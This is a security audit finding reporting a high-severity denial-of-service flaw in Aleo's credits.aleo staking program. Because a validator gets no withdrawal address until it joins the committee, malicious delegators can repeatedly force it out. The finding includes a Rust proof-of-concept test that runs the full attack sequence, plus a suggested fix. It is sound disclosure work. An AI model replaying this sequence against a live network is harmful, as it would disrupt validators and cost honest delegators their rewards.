Special Felt Alligator

High

# A validator cannot remove a delegator before joining the committee, which can lead to a constant DoS attack

## Summary
A validator cannot remove a delegator bonded to them before joining a committee. This prevents a validator from controlling their jurisdiction beforehand and can lead to a DoS.
## Vulnerability Detail
The `withdraw[]` mapping for the validator is set only when the validator joins the committee :  [credits.aleo#L245-L269](https://github.com/sherlock-audit/2024-05-aleo/blob/55b2e4a02f27602a54c11f964f6f610fee6f4ab8/snarkVM/synthesizer/program/src/resources/credits.aleo#L245-L269)
```java
// if (new_validator)
    contains committee[r0] into r16;
    branch.eq r16 true to validator_in_committee;
    // {
        // Set the withdrawal address.
        // Note: This operation is only necessary on the first time for a validator entry, in order to initialize the value.
        set r4 into withdraw[r0];

        // Check if the initial bond amount is at least 100 credits.
        gte r2 100_000_000u64 into r17;
        // Ensure that the initial bond is at least 100 credits.
        assert.eq r17 true;

        // Get the committee size.
        get.or_use metadata[aleo1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq3ljyzc] 0u32 into r18;
        // Increment the committee size by one.
        add r18 1u32 into r19;
        // Set the new committee size.
        set r19 into metadata[aleo1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq3ljyzc];

        // Check if the validator exists in the unbonding state.
        contains unbonding[r0] into r20;
        // Ensure the validator currently is not unbonding.
        assert.eq r20 false;
    // }
```
Because of this, the validator cannot pass the following check in `unbond_public`, which causes a revert : 
```java
 // Check if the validator's withdrawal address has been set.
    // Note: This contains check must use `withdraw` and **not** `committee` to ensure the validator
    // can unbond delegators even when the validator is not in the committee. Of course, if the validator is
    // in the committee, then the validator must be able to unbond its delegators.
    contains withdraw[r5.validator] into r8;
    // Get the validator's withdrawal address from the bond state, using the zero address as the default.
    get.or_use withdraw[r5.validator] aleo1qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq3ljyzc into r9;
    // Check if the validator's withdrawal address matches the caller.
    is.eq r0 r9 into r10;
    // AND the withdraw address has been set (to prevent an edge case where a validator uses the zero address as a withdrawal address).
    and r8 r10 into r11;

    // Either the caller is the staker's withdrawal address OR the validator's withdrawal address is set to the caller.
    or r7 r11 into r12;
    // Enforce the permission as `true`.
    assert.eq r12 true;
```    
Every time a validator is unbonded, they need to wait 360 blocks before they can join the committee again. When they claim their unbonded assets, the withdrawal address is removed again, which means they cannot unbond the malicious delegators, which makes it possible for malicious delegators to front-run the validator and perform a constant DoS attack. 
## Impact
This can lead to a DoS when the validator self-bonds and joins the committee for the first time. Consider the following attack scenario :

1. Malicious delegators bond to the validator, increasing the total delegated amount beyond 10M credits
2. The validator cannot unbond the malicious delegators because withdrawal mapping has not been set
3. Validator self-bonds with 100 credits and joins the committee 
4. Delegators pull their bonds through `unbond_public` and force the validator to leave the committee 
5. The validator is restricted from joining the committee again for 360 blocks, and also no other delegators can bond to the validator during this time
6.  As soon as the validator finishes unbonding, the malicious delegators can front-run the validator and repeat the same attack as their funds have finished unbonding as well.

This is also an issue for honest delegators because they will not earn rewards if the validator is not in the committee. Hence, they may be disincentivized from delegating their funds to the validator.

## Coded POC
```rust
#[test]
fn test_poc() {
    let rng = &mut TestRng::default();

    // Construct the process.
    let process = Process::<CurrentNetwork>::load().unwrap();
    // Initialize a new finalize store.
    let (store, _temp_dir) = sample_finalize_store!();

    // Initialize the validator and delegator keys
    let validator_private_key = PrivateKey::<CurrentNetwork>::new(rng).unwrap();
    let validator_address = Address::try_from(&validator_private_key).unwrap();
    let withdrawal_private_key = PrivateKey::<CurrentNetwork>::new(rng).unwrap();
    let withdrawal_address = Address::try_from(&withdrawal_private_key).unwrap();
    let delegator_private_key = PrivateKey::<CurrentNetwork>::new(rng).unwrap();
    let delegator_address = Address::try_from(&delegator_private_key).unwrap();
    let malicious_delegator_private_key = PrivateKey::<CurrentNetwork>::new(rng).unwrap();
    let malicious_delegator_address = Address::try_from(&malicious_delegator_private_key).unwrap();

    // Initialize the account balances
    let validator_balance = 1_000_000_000u64; // 1,000 credits
    let delegator_balance = 100_000_000_000_000u64;
    initialize_account(&store, &validator_address, validator_balance).unwrap();
    initialize_account(&store, &delegator_address, delegator_balance).unwrap();
    initialize_account(&store, &malicious_delegator_address, delegator_balance).unwrap();

    let delegator_amount = MIN_VALIDATOR_STAKE - 20_000_000_000u64;
    let validator_amount = MIN_VALIDATOR_SELF_STAKE;
    let malicious_amount: u64 = 20_000_000_000u64;
    // Sanity check the state before finalizing.
    assert_eq!(committee_state(&store, &validator_address).unwrap(), None);
    assert_eq!(delegated_state(&store, &validator_address).unwrap(), None);
    assert_eq!(bond_state(&store, &validator_address).unwrap(), None);
    assert_eq!(unbond_state(&store, &validator_address).unwrap(), None);
    assert_eq!(withdraw_state(&store, &validator_address).unwrap(), None);
    assert_eq!(account_balance(&store, &validator_address).unwrap(), validator_balance);
    assert_eq!(account_balance(&store, &delegator_address).unwrap(), delegator_balance);

    /*
    1. Delegator bonds to validator before validator is in the committee
    2. Validator can then bond_validator to join the committee
    */
    test_atomic_finalize!(store, FinalizeMode::RealRun, {
        //honest delegators bond to the validator
        bond_public(
            &process,
            &store,
            &delegator_private_key,
            &validator_address,
            &delegator_address,
            delegator_amount,
            rng,
        )
        .unwrap();

        // maliious delegator bonds to the validator
        bond_public(
            &process,
            &store,
            &malicious_delegator_private_key,
            &validator_address,
            &malicious_delegator_address,
            malicious_amount,
            rng,
        )
        .unwrap();
        // Check that the committee, bond, unbond, and withdraw states are correct.
        assert_eq!(committee_state(&store, &validator_address).unwrap(), None);
        assert_eq!(delegated_state(&store, &validator_address).unwrap(), Some(delegator_amount + malicious_amount));

        // Perform the bond validator with the minimum self bond
        bond_validator(
            &process,
            &store,
            &validator_private_key,
            &withdrawal_address,
            validator_amount,
            TEST_COMMISSION,
            rng,
        )
        .unwrap();

        // malicious delegator unbonds all of their bond from the validator
        unbond_public(
            &process,
            &store,
            &malicious_delegator_private_key,
            &malicious_delegator_address,
            malicious_amount,
            1u32,
            rng,
        )
        .unwrap();

        // as a result, the validator is removed from the committee
        assert_eq!(committee_state(&store, &validator_address).unwrap(), None);

        // malicious delegator claims their unbonded amount after 360 blocks
        claim_unbond_public(
            &process,
            &store,
            &malicious_delegator_private_key,
            &malicious_delegator_address,
            361u32,
            rng,
        )
        .unwrap();

        //Note that new delegators will not be able to bond to the validator while it is in unbonding state

        // validator claims their unbonded amount after 360 blocks (this can also be done by the malicious delegator on behalf of the validator)
        claim_unbond_public(&process, &store, &validator_private_key, &validator_address, 361u32, rng).unwrap();

        // NOTE : Since the delegator force unbonded the validator by completely unbonding their stake, the validator cannot block the
        // malicious delegator from bonding to them again. This is a limitation of the current design.

        // malicious delegator front runs the validator and bonds to the validator
        bond_public(
            &process,
            &store,
            &malicious_delegator_private_key,
            &validator_address,
            &malicious_delegator_address,
            malicious_amount,
            rng,
        )
        .unwrap();

        // Validator detects malicious activity, but cannot unbond the malicious delegator because the validator's
        // withdrawal address was removed in the claim unbond call. Also, a validator cannot unbond a delegator
        // before having a withdrawal address (which requires joining the committee)

        // validator tries unbonding the malicious delegator

        let result =
            unbond_public(&process, &store, &validator_private_key, &malicious_delegator_address, 0, 362u32, rng);

        // the call fails
        assert!(result.is_err());

        // validator self bonds
        bond_validator(
            &process,
            &store,
            &validator_private_key,
            &withdrawal_address,
            validator_amount,
            TEST_COMMISSION,
            rng,
        )
        .unwrap();

        // malicious delegator repeats the attack
        unbond_public(
            &process,
            &store,
            &malicious_delegator_private_key,
            &malicious_delegator_address,
            malicious_amount,
            363u32,
            rng,
        )
        .unwrap();

        // validator is removed from the committee
        assert_eq!(committee_state(&store, &validator_address).unwrap(), None);

       // the malicious delegator can just keep repeating this attack

        Ok(())
    })
    .unwrap();
}
```
To run the test  : 

1. Copy the above code into `test_credits.rs`
2. Click on `Run Test` 
## Code Snippet

## Tool used

Manual Review

## Recommendation
Do not remove the validator's withdrawal address when they claim their unbonded assets. This will give them enough time to remove any malicious delegators. Alternatively, allow validators to remove delegators when their withdrawal address is not set (withdrawal address is not set before they join the committee for the first time)